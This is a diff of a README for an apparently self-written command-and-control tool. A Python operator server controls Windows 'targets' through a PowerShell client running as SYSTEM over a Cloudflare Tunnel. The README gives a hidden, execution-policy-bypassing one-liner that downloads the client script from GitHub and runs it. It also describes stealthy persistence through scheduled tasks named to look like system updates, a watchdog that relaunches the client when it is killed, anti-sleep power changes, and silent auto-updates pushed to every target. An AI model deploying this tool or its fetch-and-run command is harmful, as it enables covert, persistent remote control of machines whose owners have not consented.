@@ -1,42 +1,118 @@
-# Shell C2
+# Shell C2 — v2.5.0
 
-A resilient, remote command and control (C2) shell consisting of an operator server (`server.py`) and a Windows client script (`pdf2.ps1`). The connection is routed securely using Cloudflare Tunnels, allowing full remote access and PowerShell command execution across NATs and firewalls.
+A resilient, persistent remote command & control shell. Operator server runs on Mac/Linux, client runs on Windows as SYSTEM. Connected securely via Cloudflare Tunnel.
 
 ## Features
 
-- **Multi-Client Support**: Seamlessly track and interact with multiple running Windows targets. Identify them by hostname, check their status, and switch between sessions.
-- **Adaptive Execution & Streaming**: Output is streamed adaptively back to the operator in real-time. Output chunks are capped to cleanly display long output.
-- **Resilience & Persistence**:
-  - The client (`pdf2.ps1`) installs itself as a Windows Scheduled Task (`SystemManagementUpdate`) to persist across reboots.
-  - Recovers from crashes directly with automatic restart logic.
-  - Automatically retries connection with exponential backoff if the Cloudflare Tunnel drops or is unready.
-- **Granular Command Control**: Abort long-running or stuck commands immediately using the `cancel` command or `Ctrl+\`. Commands legitimately meant to run forever without timeout can be run via the `notimeout:` prefix.
+| Feature | Description |
+|---|---|
+| **Multi-Client** | Track, switch between, and manage multiple Windows targets |
+| **Real-Time Streaming** | Command output streams back live, no waiting for completion |
+| **Persistence** | Survives reboot, shutdown, sleep, lid close, and Task Manager kills |
+| **Auto-Update** | Pulls latest version from GitHub every 30 min, self-restarts |
+| **Interactive Sessions** | Full stdin forwarding for `cmd`, `python`, `nslookup`, etc. |
+| **GUI Launch** | Launch visible desktop apps (`explorer`, `notepad`, `code`) via `gui:` prefix |
+| **Anti-Sleep** | Prevents laptop sleep on lid close via power policy |
+| **Cancel / Timeout** | Abort commands with `cancel` / `Ctrl+\`. Prefix `notimeout:` for long jobs |
+| **Chunked Output** | Large results split into chunks — never truncated |
+| **Self-Healing** | Connection pool flush, DNS reset, auto-restart after 5 min failure |
 
 ## Architecture
 
-```text
-[Mac] server.py  ←—Cloudflare Tunnel—→  [Windows] pdf2.ps1
-  operator types commands                 executes & streams output back
+```
+[Mac/Linux]                                [Windows Target]
+server.py  ←── Cloudflare Tunnel ──→  pdf2.ps1 (SYSTEM)
+  │                                        │
+  ├─ /cmd      → queues commands           ├─ polls /cmd
+  ├─ /stream   ← receives live output      ├─ streams output
+  ├─ /result   ← receives final output     ├─ sends final result
+  ├─ /stdin    → forwards operator input    ├─ polls /stdin (interactive)
+  ├─ /signal   → sends cancel signal       ├─ polls /signal
+  └─ /interactive → sets prompt mode        └─ sends interactive flag
 ```
 
-- **Operator (Server)**: A Python 3 multi-threaded HTTP server (`server.py`) acting as the command center on a macOS or Linux machine.
-- **Target (Client)**: A robust PowerShell script (`pdf2.ps1`) executed on the compromised/managed Windows machine.
+## Quick Start
 
-## Getting Started
+### 1. Server (Mac/Linux)
 
-Start the components in the correct order to ensure seamless connection:
+```bash
+python3 server.py
+cloudflared tunnel run <your-tunnel-name>   # separate terminal
+```
 
-1. **Start the C2 Server**:
-   ```bash
-   python3 server.py
-   ```
-2. **Start the Cloudflare tunnel** (in a separate terminal):
-   ```bash
-   cloudflared tunnel run <your-tunnel-name>
-   ```
-3. **Execute the Payload** on the Windows machine:
-   Run `pdf2.ps1`. It will establish persistence and continuously beacon securely back to the operator server through the tunnel.
+### 2. Deploy Client (one-liner on Windows)
 
-## Documentation
+```powershell
+Start-Process powershell -Verb RunAs -ArgumentList '-ep bypass -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;Invoke-WebRequest ''https://raw.githubusercontent.com/pentoshi007/test/main/pdf2.ps1'' -OutFile ''C:\pdf2.ps1'' -UseBasicParsing;& ''C:\pdf2.ps1''"'
+```
 
-For an in-depth guide on operator commands (like `sessions`, `use`, `kill`), handling truncated output, troubleshooting tunnel errors, and detailed cleanup instructions, please refer to the comprehensive [Usage Guide](usage.md).
+This downloads `pdf2.ps1` to `C:\`, auto-elevates, installs persistence, and connects.
+
+## Operator Commands
+
+### Built-in (server-side)
+
+| Command | Action |
+|---|---|
+| `sessions` | List all connected clients |
+| `use <id>` | Switch active target (by name or number) |
+| `status` | Check if active client is online |
+| `cancel` | Abort running command |
+| `Ctrl+\` | Same as cancel (keyboard shortcut) |
+| `kill <id>` | Send exit to a specific client |
+| `remove <id>` | Remove stale client from sessions |
+| `help` | Show all commands |
+| `exit` | Shut down server |
+
+### Command Prefixes
+
+| Prefix | Example | Description |
+|---|---|---|
+| `gui:` | `gui:explorer .` | Launch GUI app on user's visible desktop |
+| `notimeout:` | `notimeout:long-scan.ps1` | Run without the 300s timeout |
+
+### Interactive Commands
+
+Bare `cmd`, `python`, `nslookup`, etc. start an interactive session with stdin forwarding. Type commands as if you're in that shell. Use `cancel` to exit.
+
+## Auto-Update
+
+The client checks GitHub every 30 minutes for a new version:
+
+```
+Download latest → SHA256 hash compare → if different:
+overwrite C:\pdf2.ps1 → release mutex → exit
+→ watchdog relaunches new version in ≤1 min
+```
+
+No UAC popup, no manual intervention. Push to GitHub → all targets update automatically.
+
+## Persistence Mechanisms
+
+| Mechanism | Purpose |
+|---|---|
+| `SystemManagementUpdate` task | Runs at startup + logon as SYSTEM |
+| `SystemManagementUpdateWatchdog` task | Runs every 1 min, relaunches if killed |
+| Anti-sleep power policy | Lid close = do nothing, standby disabled |
+| WakeToRun | Wakes machine from sleep for watchdog |
+| Self-kill + restart | After 5 min continuous failure, restarts fresh |
+
+## Cleanup (Uninstall)
+
+Run as Administrator on the target:
+
+```powershell
+Unregister-ScheduledTask -TaskName "SystemManagementUpdate" -Confirm:$false
+Unregister-ScheduledTask -TaskName "SystemManagementUpdateWatchdog" -Confirm:$false
+Remove-Item C:\pdf2.ps1, C:\shell.txt -Force -ErrorAction SilentlyContinue
+# Restore lid close action: powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 1
+# Restore standby: powercfg /change standby-timeout-ac 30
+```
+
+## Version History
+
+| Version | Changes |
+|---|---|
+| **2.5.0** | GUI launch (`gui:` prefix), auto-update from GitHub, anti-sleep, interactive sessions, chunked output, version tracking |
+| **2.0.0** | Streaming execution, persistence, SSL bypass, watchdog, cancel support |
+| **1.0.0** | Basic polling, single client, no persistence |
